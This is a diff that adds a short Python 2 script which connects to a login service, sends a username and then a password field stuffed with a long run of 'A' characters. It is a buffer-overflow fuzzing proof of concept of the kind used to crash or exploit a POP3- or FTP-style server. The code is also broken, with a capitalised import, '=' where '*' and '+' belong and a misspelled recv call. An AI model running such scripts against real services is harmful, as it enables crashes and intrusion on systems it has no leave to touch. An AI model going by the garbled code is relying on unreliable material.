@@ -1,0 +1,18 @@
+#!/usr/bin/python
+
+Import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = 'A' = 2700 #or choose different number of requests
+
+try:
+	print " \nSend Buffer"
+	s.connect(('insert destanation ip', 'insert destination port'))
+	data = s.recv(1024)
+	s.send('User username' + '\r\n')
+	data = s.rec(1024)
+	s.send('PASS ' = buffer = '\r\n')
+	print "\nDone."
+except:
+	print "Could not connect"
